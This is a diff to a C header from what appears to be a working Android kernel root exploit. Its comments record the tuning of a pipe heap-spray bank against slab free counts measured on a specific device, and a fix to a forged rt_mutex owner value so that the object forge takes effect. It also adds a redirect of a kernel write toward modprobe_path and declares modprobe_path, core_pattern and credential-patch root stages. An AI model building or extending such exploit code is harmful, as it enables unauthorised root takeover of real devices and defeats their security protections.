@@ -179,7 +179,31 @@ void rmg_diag(const char *fmt, ...);
 #define PIPE_OBJS_PER_SLAB 16
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN_SLABS 15
-#define PIPE_RECLAIM_SLABS 15
+/* The reclaim bank must be LARGER than the number of free objects sitting in the kmalloc cache
+ * the pipe ring is drawn from, otherwise the cache satisfies every pipe_inode_info from its own
+ * per-CPU freelists and the buddy allocator is never asked for a new page - so the pages of the
+ * compound we just reclaimed are never used, and the page stays free.
+ *
+ * Measured on RFCWC0G1Z1J via /proc/slabinfo (readable by the shell user):
+ *     kmalloc-1k   10483 active  10688 total  ->  205 free objects   <- the ring's cache
+ *     kmalloc-2k   10758 active  10944 total  ->  186 free objects
+ *     kmalloc-512  15171 active  17120 total  -> 1949 free objects
+ * There is no kmalloc-768 on this device, and a 16-page ring is 16 * 40 = 640 bytes, which SLUB
+ * rounds up to the 1024 cache - so kmalloc-1k is the cache that matters and 205 is the number to
+ * beat.
+ *
+ * Sizing history, all measured:
+ *   15 slabs =  240 pipes: only just cleared kmalloc-2k's free count and lost the race whenever
+ *                           another process freed an object. Never reached kmalloc-1k at all.
+ *  120 slabs = 1920 pipes: cleared 205 easily but died with 'SYSCHK(pipe(pipefd)): Too many open
+ *                           files' - two fds per pipe, created in BOTH the parent and the forked
+ *                           child, so the bank never actually allocated.
+ *  40 slabs =  640 pipes: ~3x the largest relevant free count, and only ~2600 fds across parent
+ *                           and child. This is the balance point.
+ * Tunable at build time; raise it only if the fd budget allows. */
+#ifndef PIPE_RECLAIM_SLABS
+#define PIPE_RECLAIM_SLABS 40
+#endif
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
 #ifndef PIPE_MAX_ATTEMPTS
@@ -210,7 +234,12 @@ void rmg_diag(const char *fmt, ...);
 #define SLIDE_WAITER_WAKE_STATE 3
 #endif
 #ifndef SLIDE_LOCK_OWNER_VALUE
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
+/* The forged rt_mutex_base must look OWNED. The reference forge writes owner = 1
+ * (04_fake_kernel_objects.c:121) - a non-NULL sentinel, not a real task pointer.
+ * We were writing 0, which presents an UNLOCKED lock: rt_mutex_adjust_pi then
+ * takes the "nobody owns it, just boost" path instead of walking the waiter
+ * chain we carefully built, so the whole forge was inert. */
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
 #endif
 #ifndef LEGACY_RT_MUTEX_WAITER
 #define LEGACY_RT_MUTEX_WAITER 0
@@ -282,6 +311,12 @@ struct user_pipe_buffer {
 
 extern pid_t pipe_prepare_child;
 extern uintptr_t page_base;
+
+/* Direct-map base of the mm group that util.c's collect_controlled_mm_group() already reclaimed
+ * (logged as "controlled mm group selected base=..."). Reused by pipe.c's
+ * prepare_pipe_buffer_page() so the payload does not run a SECOND KernelSnitch pass to
+ * re-derive a base it already holds - see the comment at pipe.c:223. 0 means "not set yet". */
+extern uintptr_t rmg_reclaimed_mm_base;
 extern uintptr_t fake_lock;
 extern uintptr_t fake_w0;
 extern uintptr_t fake_task;
@@ -386,6 +421,10 @@ extern ssize_t slide_bootid_restore_ret;
 extern uintptr_t slide_p0_offset;
 extern uintptr_t slide_oracle_parent;
 extern uintptr_t slide_oracle_target;
+/* Redirects the slide's kernel-side store at an arbitrary kernel .data address
+ * (used to aim it at modprobe_path). 0 = keep the ashmem_misc.fops geometry. */
+void slide_set_store_target(uintptr_t target);
+uintptr_t slide_get_store_target(void);
 extern uintptr_t p0_gate_page_struct;
 extern uintptr_t p0_probe_page_struct;
 extern uintptr_t fops_data_probe_addr;
@@ -408,6 +447,7 @@ int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
 int open_ashmem_device(void);
 uintptr_t p0_data_alias(uintptr_t image_addr);
+uintptr_t kimg_linear_alias(uintptr_t image_addr);
 uintptr_t p0_alias_image_offset(uintptr_t data_alias);
 uintptr_t data_addr(uintptr_t image_addr);
 uintptr_t data_direct_addr(uintptr_t image_addr);
@@ -491,6 +531,9 @@ ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
 int repair_fake_fops_llseek(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
+int modprobe_path_root_attempt(int fd);
+int core_pattern_root_attempt(int fd);
+int root_cred_patch_attempt(int fd);
 int try_cfi_stage(void);
 
 
@@ -555,6 +598,18 @@ void start_p0_ref_keeper(void);
 #endif
 
 int install_android_root(int fd);
+
+/* Static-work cascade as a directly callable stage. install_android_root()
+ * bundles pty -> workqueue -> staticwork behind the ROOT_LEGACY gate in
+ * install_child_root(), because its workqueue stage faulted heap on early
+ * firmware. The cascade itself is pure kernel .data (shape-reads plus
+ * readback-verified plants, no SLAB writes at all), so the panic rationale
+ * does not apply to it - but payload consumers that never set ROOT_LEGACY
+ * (the app's auto flows) would otherwise never reach the proven route. This
+ * wrapper runs ONLY the cascade, with the same fail-closed creds-measured
+ * publish install_android_root() applies, and leaves install_android_root()
+ * itself untouched. */
+int install_static_work_stage(int fd);
 
 /*
  * Pre-exploit KernelSU liveness probe.
